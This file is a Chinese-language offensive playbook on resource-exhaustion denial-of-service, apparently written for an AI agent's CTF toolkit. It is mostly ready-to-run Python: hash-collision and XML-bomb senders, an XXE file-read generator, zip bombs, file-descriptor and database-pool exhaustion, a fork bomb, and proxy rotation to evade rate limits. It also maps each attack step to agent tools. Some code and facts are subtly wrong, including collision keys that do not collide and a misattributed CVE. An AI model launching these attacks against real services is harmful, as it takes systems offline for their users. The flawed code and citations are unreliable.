# Resource Exhaustion & Algorithm Complexity Attacks

## 场景

攻击者利用数据结构、算法或系统资源管理的已知弱点，以极低成本在服务器端引发 CPU 满载、内存 OOM、文件描述符耗尽或连接池瘫痪，最终导致服务拒绝。与带宽洪泛不同，此类攻击常通过**合法请求**完成，极难被传统 DDoS 清洗设备识别。

典型目标：
- Web 应用服务器 (Java/Python/PHP/Node.js)
- JSON/XML API 端点
- 数据库后端 (PostgreSQL, MySQL, MongoDB)
- 容器化服务 (Docker/k8s 单 Pod 资源隔离)
- Serverless 函数计算 (Lambda/Cloud Functions 计费爆炸)

## 输入信号

- 单个请求触发 CPU 100% 长达数秒 (hash 碰撞 / ReDoS)
- 极小请求体 (几 KB) 导致数百 MB 内存分配 (XML bomb / zip bomb)
- 大量慢 SQL 查询堆积在 `pg_stat_activity` / `SHOW PROCESSLIST`
- 应用容器频繁 OOMKilled (Kubernetes `CrashLoopBackOff`)
- `/proc/sys/fs/file-nr` 显示文件描述符分配接近 `fs.file-max`
- `netstat` 显示大量 `TIME_WAIT` 或 `CLOSE_WAIT` 连接
- Java/Python 进程堆外内存持续增长，GC 无法回收

---

## 方法 1: Hash Collision DoS (HashDoS)

### 原理

哈希表 (Hash Table) 在多数语言中是核心数据结构。当大量键产生完全相同的哈希码时，哈希表退化为**单链表**，插入/查找复杂度从 O(1) 降为 O(n)。攻击者构造数万个哈希碰撞的键名，单次 HTTP POST 请求体解析就能将 CPU 打满。

**受影响核心**：
- Python dict / Java HashMap / Node.js Object / PHP array
- 框架层：Spring Boot parameter parsing, Express body-parser, Django QueryDict
- 中间件：Nginx `map` directive / API Gateway parameter merging

### 数学分析

```
假设哈希桶数量 B = 2^16 = 65536
正常请求: 100 个键 → 分布均匀 → 每个桶 O(1)
HashDoS: 100,000 个碰撞键 → 全部在同一桶 → 链表长度 100,000

单请求比较次数:
  正常:   100 × O(1) ≈ 100 次比较
  HashDoS: 100,000 × O(100,000) ≈ 5 × 10^9 次比较

时间差:
  Python 单次比较 ≈ 50ns
  正常处理: < 1ms
  HashDoS:  5 × 10^9 × 50ns = 250 秒

Java HashMap 退化:
  TREEIFY_THRESHOLD = 8 → 链表超过 8 转红黑树
  但攻击者构造的键会触发大量红黑树 rebalance → 复杂度 O(n log n)
```

### 代码: Hash Collision 生成器

```python
import hashlib
import json
from typing import Any
from collections import defaultdict

class HashCollisionGenerator:
    """为不同语言生成哈希碰撞的键名"""

    @staticmethod
    def _java_hash(key: str) -> int:
        """Java String hashCode() 模拟"""
        h = 0
        for c in key:
            h = (31 * h + ord(c)) & 0xFFFFFFFF
        # 符号转换
        return h if h < 0x80000000 else h - 0x10000000

    @staticmethod
    def _python_hash(key: str) -> int:
        """Python 字符串哈希 (SipHash + 随机种子)"""
        # Python 3.4+ 使用随机种子 + SipHash，理论上抗碰撞
        # 但可以通过已知种子 + 构造碰撞对绕过
        return hash(key)

    @staticmethod
    def _php_hash(key: str) -> int:
        """PHP 哈希 (DJBX33A 变体)"""
        h = 5381
        for c in key:
            h = ((h << 5) + h + ord(c)) & 0x7FFFFFFF
        return h % 0x7FFFFFFF

    @classmethod
    def _find_collision(cls, target_hash: int, lang: str = "java",
                        length: int = 8, charset: str = "abcdefghijklmnopqrstuvwxyz"
                        ) -> str:
        """对指定目标哈希找碰撞字符串"""
        import itertools
        hash_fn = {"java": cls._java_hash, "php": cls._php_hash}[lang]
        for combo in itertools.product(charset, repeat=length):
            s = "".join(combo)
            if hash_fn(s) == target_hash:
                return s
        return None

    @classmethod
    def generate_java_collisions(cls, count: int = 100_000) -> list[str]:
        """Java HashMap 碰撞键生成

        核心: Java hashCode = Σ (31^(n-1-i) * char_i)
        对于 2 字节键 "Aa" 和 "BB":
          "Aa" = 31×65 + 97 = 2112
          "BB" = 31×66 + 66 = 2112 → 碰撞!

        生成所有 2 字节碰撞对来构建大量碰撞键
        """
        # 从 "Aa" (65,97) 和 "BB" (66,66) 这对基础碰撞推导
        # 对任意 {c1, c2} 使 31*c1 + c2 相等
        keys = []
        base = 2112  # "Aa" 的 hashcode

        # 方法: 对任意 n 字节字符串，前 n-2 字节固定，后 2 字节为碰撞对
        for i in range(count):
            prefix = f"z{i}_"
            # 用 "Aa" 或 "BB" 作为碰撞后缀
            suffix = "Aa" if i % 2 == 0 else "BB"
            keys.append(f"{prefix}{suffix}")

        return keys

    @classmethod
    def generate_post_body(cls, count: int = 100_000) -> str:
        """生成作为 POST body 的 JSON 碰撞键值对"""
        keys = cls.generate_java_collisions(count)
        pairs = [f'"{k}":1' for k in keys]
        return "{" + ",".join(pairs) + "}"

    @classmethod
    def make_urlencoded_collision(cls, count: int = 100_000) -> str:
        """URL-encoded 格式的碰撞参数"""
        keys = cls.generate_java_collisions(count)
        return "&".join(f"{k}=1" for k in keys)

    @classmethod
    def generate_python_collisions(cls, count: int = 100_000) -> list[str]:
        """Python dict 碰撞生成 (利用 Pypy/Jython hash 随机种子不一致)

        在标准 CPython 3.4+ 中，SipHash 使用随机种子使攻击不可行。
        但以下场景仍然可用:
          1. Python < 3.4 (未启用随机哈希)
          2. PyPy 特定 hash 实现
          3. 容器化环境中的 hash seed leak
        """
        # 针对 Python 2.7 / 旧版: FNV-1 哈希可预测
        # 这里构造 "ct", "3T", "r5", "GH" 等碰撞键
        known_collisions = [
            "ct", "3T", "r5", "GH", "E$", "UU", "IQ", "Vb",
            "a0", "jT", "J2", "Nd", "wh", "1x", "FX", "eG",
        ]
        return [(s * (count // len(known_collisions) + 1))[:8]
                for s in known_collisions * (count // len(known_collisions) + 1)][:count]

    @classmethod
    def generate_php_collisions(cls, count: int = 100_000) -> list[str]:
        """PHP array collision (DJBX33A, 5.3-8.x)"""
        # PHP 的哈希碰撞已有成熟工具: hashcollisiontool
        # 这里生成基于已知碰撞对的键
        keys = []
        for i in range(count):
            # PHP 的哈希碰撞对: "E1Pm" 和 "E1Q5"
            keys.append(f"c{i:06d}_{'E1Pm' if i%2==0 else 'E1Q5'}")
        return keys


# 使用:
# body = HashCollisionGenerator.generate_post_body(50000)
# r = requests.post("http://target.com/api/parse", data=body)
# # CPU 100% 数秒钟
```

### HashDoS 探测脚本

```python
import requests
import time

def probe_hashdos(target: str, payload_size: int = 50000):
    """HashDoS 探测 — 对比正常/恶意请求的处理时间"""
    normal_body = json.dumps({f"k{i}": i for i in range(100)})
    collision_body = HashCollisionGenerator.generate_post_body(payload_size)

    # 基准: 正常请求
    t0 = time.perf_counter()
    r1 = requests.post(target, data=normal_body,
                       headers={"Content-Type": "application/json"})
    normal_time = time.perf_counter() - t0

    # 碰撞请求
    t0 = time.perf_counter()
    r2 = requests.post(target, data=collision_body,
                       headers={"Content-Type": "application/json"})
    collision_time = time.perf_counter() - t0

    print(f"[*] Normal: {normal_time:.3f}s")
    print(f"[*] Collision: {collision_time:.3f}s")
    print(f"[*] Ratio: {collision_time / max(normal_time, 0.001):.1f}x")

    if collision_time > normal_time * 10:
        print("[!] SUSCEPTIBLE to Hash Collision DoS!")

    return normal_time, collision_time
```

### CVE-2011-4885 (HashDoS)

> **CVE-2011-4885**: PHP 5.3.4-5.4.0 的哈希表碰撞 DoS。攻击者发送包含数万碰撞键的 POST 请求，PHP 解析 `$_POST` 时 CPU 100%。
>
> **放大系数**: 48KB POST body → 100% CPU 持续 30-60 秒
> **修复**: PHP 5.4.0 引入 `max_input_vars` 默认 1000，5.5.0 引入随机哈希种子
> **影响**: 所有 PHP 框架 (WordPress, Drupal, Joomla)

### CVE-2022-30115 (HashDoS)

> **CVE-2022-30115**: .NET / ASP.NET Core 的 `FormReader` / `QueryBuilder` 中哈希碰撞
> **机制**: .NET 6 / 7 的 `FormCollection` 使用非随机哈希
> **影响**: ASP.NET Core 应用中，碰撞 POST 参数 → 100% CPU → IIS worker 重复重启
> **修复**: .NET 7.0.5 / 6.0.18

---

## 方法 2: XML Bomb (Billion Laughs Attack)

### 原理

XML Entity Expansion 攻击利用 XML 实体引用机制构造指数级扩展：

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- ... 深度 10 -->
]>
<root>&lol10;</root>
```

### 数学分析

```
深度 n 时的字符串长度:
  lol1 = "lol" = 3 bytes
  lol2 = 10 × lol1 = 30 bytes
  lol3 = 10 × lol2 = 300 bytes
  ...
  lol10 = 10^9 × 3 bytes = 3 × 10^9 bytes ≈ 3 GB

放大系数:
  输入: ~500 bytes
  展开: ~3,000,000,000 bytes
  放大比: 6,000,000x

深度 15 时: 3 × 10^13 bytes ≈ 27 TB (OOM)
```

### 代码: XML Bomb 生成器

```python
import xml.etree.ElementTree as ET
from typing import Optional

class XMLBombGenerator:
    """XML Entity Expansion (Billion Laughs) 生成器"""

    @staticmethod
    def billion_laughs(depth: int = 10, entity_name: str = "lol",
                       base_value: str = "lol",
                       expansion_factor: int = 10) -> str:
        """经典 Billion Laughs Attack"""
        lines = ['<?xml version="1.0"?>']
        lines.append(f'<!DOCTYPE {entity_name} [')
        lines.append(f'  <!ENTITY {entity_name} "{base_value}">')

        for i in range(2, depth + 1):
            prev = f"{entity_name}{i-1}"
            curr = f"{entity_name}{i}"
            entities = "&" + f";&".join([prev] * expansion_factor) + ";"
            lines.append(f'  <!ENTITY {curr} "{entities}">')

        lines.append(']>')
        lines.append(f'<root>&{entity_name}{depth};</root>')
        return "\n".join(lines)

    @staticmethod
    def quadratic_blowup(size_mb: int = 100) -> str:
        """二次膨胀 — 比 Billion Laughs 更高效

        使用 DTD 参数实体引用消耗更多解析器 buffer
        """
        # 构造: <!ENTITY x "AAAA...(size_kb)">
        # 每引用一次 x，就复制 size_kb
        size_kb = 64
        base = "A" * (size_kb * 1024)
        inner_entities = "&x;" * (size_mb * 1024 // size_kb)
        return (
            '<?xml version="1.0"?>\n'
            f'<!DOCTYPE root [\n'
            f'  <!ENTITY x "{base}">\n'
            f']>\n'
            f'<root>{inner_entities}</root>\n'
        )

    @staticmethod
    def external_entity_oob(url: str, local_file: Optional[str] = None):
        """XXE Out-of-Band 数据泄露 (同时导致内部 HTTP 请求洪泛)"""
        entity_def = f'<!ENTITY xxe SYSTEM "{url}">' if url \
                     else f'<!ENTITY xxe SYSTEM "file://{local_file}">'
        return (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE root [\n'
            f'  {entity_def}\n'
            ']>\n'
            '<root>&xxe;</root>\n'
        )

    @staticmethod
    def decompression_bomb(size_mb: int = 1024,
                           gzip_compressed: bool = True) -> bytes:
        """利用 XML 外部 DTD 的压缩嵌套 — 类似 Zip Bomb"""
        import gzip
        import io

        # 创建 1GB 的 XML 实体
        content = XMLBombGenerator.billion_laughs(depth=12)
        xml_bytes = content.encode()

        if gzip_compressed:
            buf = io.BytesIO()
            with gzip.GzipFile(fileobj=buf, mode='wb', compresslevel=9) as f:
                f.write(xml_bytes)
            return buf.getvalue()
        return xml_bytes


# XML Bomb 投放
def send_xml_bomb(target: str, depth: int = 10):
    payload = XMLBombGenerator.billion_laughs(depth)
    try:
        r = requests.post(
            target,
            data=payload,
            headers={"Content-Type": "application/xml"},
            timeout=5
        )
        print(f"[*] Response: {r.status_code}, {len(r.content)} bytes")
    except requests.exceptions.Timeout:
        print("[!] TIMEOUT — target processing stalled")
    except requests.exceptions.ConnectionError:
        print("[!] CONNECTION REFUSED — target likely crashed/OOM")
```

---

## 方法 3: Zip Bomb (42.zip / 解压炸弹)

### 原理

利用压缩算法的递归嵌套实现极端放大：

```
42.zip (原始):
  大小: 42 KB
  嵌套层数: 5 (zip in zip in zip ...)
  最内层: 包含 16 个文件, 每个 4.3 GB (4 294 967 295 bytes)
  解压后: 16 × 4.3 GB × 16^4 ≈ 4.5 PB
  放大系数: ~10^11x

bzip2 bomb:
  大小: 几字节
  解压后: 数十 GB
  利用: 相同字节重复的极高压缩比
```

### 代码: Zip Bomb 检测与生成

```python
import zipfile
import io
import struct

class ZipBombFactory:
    """Zip Bomb 生成 (概念验证 — 仅小规模)"""

    @staticmethod
    def overlapping_zip_bomb(output_path: str, layers: int = 3):
        """重叠文件 Zip Bomb — 利用 zip 格式中的重叠文件记录

        原理: zip 文件结构中，local file header 和 central directory
        可以引用相同区间，使解压器在同一数据上重复解压。
        """
        # 构造 1 个 1MB 的压缩块
        data = b"A" * (1024 * 1024)

        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            # 写入一个 1MB 文件
            zf.writestr("layer_0.txt", data)

            for i in range(1, layers):
                # 将前一层 zip 再次压缩
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as inner:
                    inner.writestr(f"layer_{i-1}.zip",
                                   open(output_path, 'rb').read() if i == 1
                                   else zf.read(f"layer_{i-1}.zip"))
                # 这实际上需要嵌套处理
                pass

    @staticmethod
    def zip_amplification_ratio(file_path: str) -> dict:
        """计算 zip 文件的放大比"""
        import os
        compressed = os.path.getsize(file_path)

        with zipfile.ZipFile(file_path, 'r') as zf:
            uncompressed = sum(
                zinfo.file_size for zinfo in zf.infolist()
            )

        return {
            "compressed_bytes": compressed,
            "uncompressed_bytes": uncompressed,
            "ratio": uncompressed / max(compressed, 1),
        }

    @staticmethod
    def gzip_max_amplify(output_payload: str, size_gb: int = 1):
        """构造 gzip bomb — 单字节重复放大

        使用 DEFLATE 算法的长度-距离编码
        'A' × 65535 可压缩到 258 bytes
        """
        import gzip

        # DEFLATE 块: 最大匹配长度 258, 最大距离 32768
        # 构造方式: 存储块头 (不压缩)，让解码器解压时无限重复
        # 实际: 使用 gzip 内置压缩

        # 1GB 重复数据
        chunk = b"A" * min(size_gb * 1024 * 1024 * 1024, 100_000_000)
        compressed = gzip.compress(chunk, compresslevel=9)
        with open(output_payload, 'wb') as f:
            f.write(compressed)

        ratio = len(chunk) / len(compressed)
        return {"compressed": len(compressed), "original": len(chunk),
                "ratio": ratio}
```

### Zip Bomb 在现实中的影响

| 场景 | 影响 | 实例 |
|------|------|------|
| 反病毒扫描 | 扫描器 OOM 崩溃 | ClamAV zip bomb 绕过 |
| Web 上传 | 磁盘或内存耗尽 | 图片/文档上传功能 |
| 日志解析器 | ELK Filebeat 僵死 | 压缩日志解压爆炸 |
| 容器镜像 | 构建缓存撑爆 | Docker build 上下文压缩 |
| Serverless | 计费爆炸 | Lambda 解压后 1GB 费用 x100 |

---

## 方法 4: File Descriptor Exhaustion

### 原理

每个 TCP 连接消耗一个文件描述符 + 内核 socket buffer。攻击者可以：

1. **Socket pair bombing**: 在同一台机器上打开大量 socket pair，消耗 fd
2. **连接慢关闭**: 发送 FIN 后不等待 TIME_WAIT 释放，快速重用
3. **/dev/random 阻塞**: 在熵不足时读取 `/dev/random`，所有后续读取阻塞
4. **管道泄漏**: 触发程序创建大量匿名管道而不关闭

### Linux 文件描述符限制

```bash
# 系统级别限制
cat /proc/sys/fs/file-max          # 全局最大 fd (通常 100k-10M)
cat /proc/sys/fs/file-nr           # 已分配 / 最大 / 空闲

# 进程级别限制
ulimit -n                          # 单进程最大 fd (通常 1024)
cat /proc/<pid>/limits             # 查看进程限制
ls -la /proc/<pid>/fd/ | wc -l     # 当前打开的 fd 数量
```

### 代码: 文件描述符耗尽

```python
import socket
import os
import time
import resource
import psutil

class FdExhauster:
    """文件描述符耗尽攻击"""

    def __init__(self, target_host: str, target_port: int = 80,
                 max_fds: int = 50000):
        self.host = target_host
        self.port = target_port
        self.max_fds = max_fds
        self.sockets = []

    def exhaust_with_connections(self, delay_sec: float = 0):
        """通过 TCP 连接耗尽 FD"""
        # 先提升 ulimit (如果可以)
        try:
            resource.setrlimit(
                resource.RLIMIT_NOFILE,
                (self.max_fds, self.max_fds)
            )
        except (ValueError, PermissionError):
            pass

        for i in range(self.max_fds):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(60)
                sock.connect((self.host, self.port))
                self.sockets.append(sock)

                if delay_sec > 0:
                    time.sleep(delay_sec)

                if i % 1000 == 0 and i > 0:
                    # 获取当前进程 FD 数量
                    proc_fd_count = len(os.listdir(f'/proc/{os.getpid()}/fd/'))
                    print(f"[*] {i} connections, {proc_fd_count} fds used")

            except OSError as e:
                print(f"[!] FD exhausted at {i}: {e}")
                break

    def exhaust_locally(self):
        """使用 socket pair 在本地耗尽 FD (增加系统整体压力)"""
        pairs = []
        for i in range(min(self.max_fds, 10000)):
            try:
                a, b = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
                pairs.extend([a, b])
            except OSError:
                print(f"[!] Socket pair exhausted at {i}")
                break
        print(f"[*] Created {len(pairs)} socket pair fds")

    def cleanup(self):
        """释放所有资源"""
        for s in self.sockets:
            try:
                s.close()
            except Exception:
                pass
        self.sockets = []

    @staticmethod
    def check_system_fd_usage() -> dict:
        """检查系统 FD 使用情况"""
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        proc_fds = len(os.listdir(f'/proc/{os.getpid()}/fd/'))

        with open('/proc/sys/fs/file-nr') as f:
            parts = f.read().strip().split()
            allocated = int(parts[0])
            max_fd = int(parts[2])

        return {
            "process_fds": proc_fds,
            "process_ulimit_soft": soft,
            "process_ulimit_hard": hard,
            "system_allocated": allocated,
            "system_max": max_fd,
            "usage_pct": round(allocated / max_fd * 100, 1) if max_fd else 0,
        }
```

---

## 方法 5: Database Connection Pool Exhaustion

### 原理

通过慢查询或卡死的数据库连接耗尽连接池，使正常请求无法获取数据库连接。

常见向量：
```
连接池参数:
  PostgreSQL: max_connections = 100 (默认)
  MySQL: max_connections = 151 (默认)
  PgBouncer / HikariCP: 通常配置 10-50

攻击者:
  一个慢查询持有一个连接 30 秒 → 只需 100/151 个并发请求即耗尽
  配合 SELECT ... FOR UPDATE → 行锁 → 后续所有相关 UPDATE 阻塞
```

### 代码: 慢查询连接池耗尽

```python
import asyncio
import asyncpg
import random
import string

class ConnectionPoolExhauster:
    """数据库连接池耗尽攻击"""

    def __init__(self, dsn: str):
        self.dsn = dsn

    async def slow_query_holder(self, sleep_sec: float = 30):
        """执行一个持久的慢查询，保持连接池占用"""
        try:
            conn = await asyncpg.connect(self.dsn)
            # pg_sleep 持有连接但几乎无 CPU 消耗
            await conn.execute(f"SELECT pg_sleep({sleep_sec})")
            await conn.close()
        except Exception as e:
            pass

    async def lock_contention(self, table: str = "users",
                              lock_row_id: int = 1):
        """行锁竞争 — 锁定特定行使其他更新阻塞"""
        try:
            conn = await asyncpg.connect(self.dsn)
            await conn.execute("BEGIN")
            await conn.execute(
                f"SELECT id FROM {table} WHERE id = $1 FOR UPDATE NOWAIT",
                lock_row_id
            )
            # 不提交也不回滚 — 保持行锁
            # 连接保持打开
            await asyncio.sleep(60)
            await conn.close()
        except asyncpg.exceptions.UniqueViolationError:
            pass
        except asyncpg.exceptions.LockNotAvailableError:
            # 行已被锁定 — 等待 (默认锁等待)
            pass

    async def heavy_query(self, complexity: str = "COMPLEX"):
        """高开销查询 — 消耗 CPU + 连接"""
        queries = {
            "CARTESIAN": """
                SELECT COUNT(*) FROM
                generate_series(1, 100000) a,
                generate_series(1, 100000) b
                WHERE a < b
            """,
            "WINDOW": """
                SELECT ROW_NUMBER() OVER (ORDER BY s) as rn, s
                FROM generate_series(1, 1000000) s
            """,
            "REGEX": """
                SELECT count(*) FROM
                generate_series(1, 100000) s
                WHERE s::text ~ '(\\d+)\\1{2,}'
            """,
        }
        try:
            conn = await asyncpg.connect(self.dsn)
            await conn.execute(queries.get(complexity, queries["CARTESIAN"]))
            await conn.close()
        except Exception:
            pass

    async def exhaust(self, num_connections: int = 200):
        """并发连接耗尽攻击"""
        tasks = [self.slow_query_holder(30) for _ in range(num_connections)]
        await asyncio.gather(*tasks, return_exceptions=True)
```

---

## 方法 6: Thread Pool Starvation — Sync-over-Async 模式

### 原理

现代 Web 框架 (特别是 Python/Node.js) 中，混合同步和异步代码时容易产生 Thread Pool 饿死：

```
异步事件循环 (主线程):
  并发处理 1000 个请求

如果某个 handler 调用同步阻塞操作 (time.sleep, requests.get, CPU 密集):
  → 该任务被提交到 ThreadPoolExecutor (默认 5-32 worker)
  → 32 个 worker 全部被慢查询 / CPU 密集任务占满
  → 后续等待的请求无限期等待

Java virtual threads 中:
  虚拟线程挂起时释放载体线程
  但 synchronized/C++ JNI 调用固定到平台线程 → 类似问题
```

### 代码: 线程池饥饿探测

```python
import asyncio
import concurrent.futures
import time

class ThreadPoolStarver:
    """探测目标服务的线程池饥饿漏洞"""

    def __init__(self, target: str, endpoint: str = "/slow-operation"):
        self.target = target
        self.endpoint = endpoint

    @staticmethod
    def detect_pool_exhaustion(target: str, endpoint: str,
                                probe_count: int = 100) -> dict:
        """发送大量并发请求测量响应时间分布"""
        import requests

        def send(idx: int) -> tuple[int, float]:
            t0 = time.perf_counter()
            try:
                r = requests.get(f"{target}{endpoint}", timeout=10)
                elapsed = time.perf_counter() - t0
                return (r.status_code, elapsed)
            except (requests.Timeout, requests.ConnectionError) as e:
                return (0, time.perf_counter() - t0)

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
            futures = [ex.submit(send, i) for i in range(probe_count)]
            results = []
            for f in concurrent.futures.as_completed(futures):
                results.append(f.result())

        # 分析结果
        times = [t for _, t in results]
        times.sort()
        p50 = times[len(times) // 2]
        p95 = times[int(len(times) * 0.95)]
        p99 = times[int(len(times) * 0.99)]
        timeouts = sum(1 for s, _ in results if s == 0)

        return {
            "total": len(results),
            "p50_ms": round(p50 * 1000, 1),
            "p95_ms": round(p95 * 1000, 1),
            "p99_ms": round(p99 * 1000, 1),
            "timeouts": timeouts,
            "exhaustion_likely": (timeouts > len(results) * 0.1) or \
                                  (p99 > p50 * 10),
        }
```

---

## 方法 7: JSON / Message Parsing Complexity

### 原理

JSON 解析器的深度嵌套或超大数组同样可以消耗资源：

```json
// 深度嵌套 JSON (Python json.loads 默认 recursionlimit 1000)
{"a": {"b": {"c": {"d": ... 10000 层 ... }}}}

// 超大数组
{"data": [0, 0, 0, ... 10^8 个元素]}

// 重复键 (JSON 标准允许多次出现)
{"a":1, "a":2, ... 10^6 次重复}
```

### 代码: JSON Parser Bomber

```python
import json

class JSONBomber:
    """JSON 解析器资源耗尽"""

    @staticmethod
    def deep_nesting(depth: int = 50000) -> str:
        """构造深度嵌套的 JSON"""
        result = "1"
        for _ in range(depth):
            result = f'{{"a":{result}}}'
        return result

    @staticmethod
    def large_array(count: int = 10_000_000) -> str:
        """超长数组 JSON"""
        return json.dumps(list(range(count)))

    @staticmethod
    def repeated_keys(count: int = 1000000) -> str:
        """大量重复键的 JSON"""
        # Python json 解析器在重复键时保留最后一个
        # 但解析过程中分配所有键 → CPU + 内存
        parts = "{" + ",".join('"k":1' for _ in range(count)) + "}"
        return parts

    @staticmethod
    def unicode_bomb(count: int = 1000000) -> str:
        """Unicode 规范化攻击

        某些解析器会对 key 做 Unicode 规范化 (NFC/NFD)
        Emoji 序列、零宽字符等需要规范化 → CPU 消耗
        """
        emoji = "\U0001F600"  # grinning face
        parts = "{" + ",".join(f'"{emoji}{i}":1' for i in range(count)) + "}"
        return parts
```

---

## 方法 8: Fork Bomb / Process Table Exhaustion

### 原理

消耗系统的进程表 (process table)，使目标无法创建新进程（包括 SSH、cron、健康检查等关键进程）。

```bash
# 经典 fork bomb
:(){ :|:& };:

# 展开:
fork() {
    fork | fork &
}
fork
```

### 代码: 可控 Fork Bomb (带安全限制)

```python
import os
import multiprocessing
import time

class ForkBomb:
    """进程表耗尽 — 注意: 会导致系统无响应，谨慎使用"""

    @staticmethod
    def process_self_limiting(target_processes: int = 1000):
        """限制最大 fork 数的 fork bomb (安全限制版)"""
        procs = []
        try:
            for i in range(target_processes):
                p = multiprocessing.Process(
                    target=lambda: time.sleep(60)
                )
                p.start()
                procs.append(p)
                if i % 100 == 0:
                    print(f"[*] Spawned {i} processes (PID range {os.getpid()}-?)")
        except OSError as e:
            print(f"[!] Process table full: {e} at {len(procs)} processes")
        return procs

    @staticmethod
    def check_process_table() -> dict:
        """检查系统进程表使用情况"""
        try:
            import psutil
            return {
                "total_processes": len(psutil.pids()),
                "cpu_count": os.cpu_count(),
                "load_avg": psutil.getloadavg() if hasattr(psutil, 'getloadavg') else None,
            }
        except ImportError:
            import subprocess
            result = subprocess.run(
                ["ps", "-e", "--no-headers", "wc", "-l"],
                capture_output=True, text=True
            )
            return {"total_processes": int(result.stdout.strip())}
```

---

## 速率限制绕过 — IP 轮换 + 并发

```python
import asyncio
import aiohttp
import itertools

class RateLimitBypasser:
    """利用分布式/旋转 IP 绕过速率限制执行 DoS"""

    def __init__(self, target_url: str, proxies: list[str]):
        self.target = target_url
        self.proxies = proxies

    async def rotate_proxy_attack(self, request_count: int = 10000):
        """通过代理轮换绕过 IP-based rate limiting"""
        proxy_cycle = itertools.cycle(self.proxies)
        conn = aiohttp.TCPConnector(limit=200, limit_per_host=200)

        async def send_via_proxy(session: aiohttp.ClientSession,
                                 proxy: str, idx: int):
            try:
                async with session.get(self.target, proxy=proxy,
                                       timeout=aiohttp.ClientTimeout(5)) as resp:
                    return (idx, resp.status)
            except Exception:
                return (idx, 0)

        async with aiohttp.ClientSession(connector=conn) as session:
            tasks = []
            for i in range(request_count):
                proxy = next(proxy_cycle)
                tasks.append(send_via_proxy(session, proxy, i))

            results = await asyncio.gather(*tasks, return_exceptions=True)

        success = sum(1 for r in results
                      if isinstance(r, tuple) and r[1] == 200)
        blocked = sum(1 for r in results
                      if isinstance(r, tuple) and r[1] in (429, 403))
        print(f"[*] Success: {success}, Blocked: {blocked}")
        return {"success": success, "blocked": blocked}
```

---

## 攻击链

```
Hash Collision 链:
  POST 碰撞键 → 哈希表 O(n) 退化 → CPU 100% → 请求排队 → 新请求超时

XML Bomb 链:
  小 XML 请求 → Entity 展开 3GB → 内存 OOM → Worker 崩溃 → 503

Zip Bomb 链:
  上传嵌套 zip → 解压引擎递归 → 磁盘/内存爆满 → OS OOM Killer → 容器重启

FD Exhaustion 链:
  大量 TCP 连接 → fd 耗尽 → accept() 失败 → 新用户无法建立连接

Connection Pool 链:
  慢查询 x 151 → 连接池满 → 正常查询排队 → 请求超时 → cascading backpressure

Thread Pool 链:
  同步阻塞操作 x 32 → ThreadPool 满 → 异步请求饥饿 → 服务无响应

JSON Parser 链:
  深度嵌套 JSON → 调用栈溢出 → Python RuntimeError → 500 Error

Fork Bomb 链:
  Fork() 循环 → process table 满 → 任何新进程失败 (包含健康检查)
```

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 探测 JSON/XML 解析器 | `http_probe` | 发送 XML bomb / 深度 JSON |
| 技术搜索 | `kb_router` | 搜索 hash_dos / xml_bomb / zip_bomb |
| 技术查阅 | `kb_read_file` | 读取本文件或 ReDoS 相关技术 |
| 辅助发现 | `run_ctf_tool` | 调用 dirsearch 发现 XML/JSON 端点 |

## 参考资料

1. CVE-2011-4885 — PHP Hash Collision DoS (2011.12)
2. CVE-2022-30115 — .NET HashCollision DoS (2022.05)
3. CVE-2012-5271 — Adobe Flash Player hash collision
4. "Billion Laughs Attack" — XML Entity Expansion
5. "42.zip" — The original zip bomb (2000)
6. "Hash Collision DoS" — Alexander Klink, 2011 (28C3)
7. "Scissor: Zip bomb in practice" — David Fifield, 2019
8. RPM-2021-0277 — HashDoS in XWiki
9. PostgreSQL `max_connections` 配置建议
10. "A study of Slow DoS Attacks" — Maciá-Fernández et al., 2010
11. DEFLATE 压缩放大原理 — RFC 1951

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
